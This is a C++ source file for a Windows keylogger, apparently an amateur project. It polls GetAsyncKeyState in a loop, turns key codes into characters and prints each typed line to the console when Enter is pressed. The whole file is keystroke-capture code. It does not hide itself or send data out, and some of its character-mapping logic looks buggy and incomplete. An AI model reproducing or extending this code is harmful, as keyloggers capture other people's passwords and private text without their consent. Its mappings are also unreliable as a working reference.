// KeyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <iostream>
#include <cstdlib>
using namespace std;



string currentSentence = "";

/*
Checks to see if a value is a number or not 
*/
bool isNum(DWORD value) {
	if (value >= 0x30 && value <= 0x39)
		return true;
	return false;
}

bool isSpecial(DWORD value) {
	if (value >= 0xBA && value <= 0xDF)
		return true;
	return false;
}
void findLetterTyped() {

	char alphabet[26] = { 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z' };
	char numbers[10] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
	char special[11] = { ';','=',',','-','.','/','`','[','\\',']','\''};

	DWORD word = 0x30;
	for (int i = 0; i < 52; i++) {
		if ((GetAsyncKeyState(word) & 1)) { //Loops through every single letter until it finds the one with the least bit number changed 

			if (GetKeyState(VK_SHIFT) & 0x8000) {
				if (isNum(word)) {
					switch (word) {
					case 0x31:
						currentSentence += "!";
						break;
					case 0x32:
						currentSentence += "@";
						break;
					case 0x33:
						currentSentence += "#";
						break;
					case 0x34:
						currentSentence += "$";
						break;
					case 0x35:
						currentSentence += "%";
						break;
					case 0x36:
						currentSentence += "^";
						break;
					case 0x37:
						currentSentence += "&";
						break;
					case 0x38:
						currentSentence += "*";
						break;
					case 0x39:
						currentSentence += "(";
						break;
					case 0x30:
						currentSentence += ")";
						break;
					default:
						currentSentence += "ERROR";
						break;
					}
				}
				else {
					currentSentence += toupper(alphabet[abs(42 - i - 26 + 1)]);
				}
				
				
				
			}else if (isNum(word)) { //Deals with Uppercase letters
				currentSentence += numbers[i];
				
			}
			else {
				currentSentence += alphabet[abs(42-i-26+1)];
			}
			
		}

		word++;

	}

	DWORD specialKey = 0xBA; 
	for (int i = 0; i < 37; i++) {
		if (GetAsyncKeyState(specialKey) & 1) {
			if (GetKeyState(VK_SHIFT)) {


			}
			else {
				if (i <= 7) {
					cout << "run" << endl;
					currentSentence += special[i];
				
				}
				else if (i >= 31) {
					currentSentence += special[abs(37 - i - 11)];
				}
				cout << i << " " << specialKey << endl;
				
			}
		}
		specialKey++;
	}
	if (GetAsyncKeyState(VK_RETURN) & 1) {
		cout << currentSentence << endl;
		currentSentence = "";
		return;
	}
}


int main()
{
	while (1) {
		Sleep(1);
		findLetterTyped();
	}
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
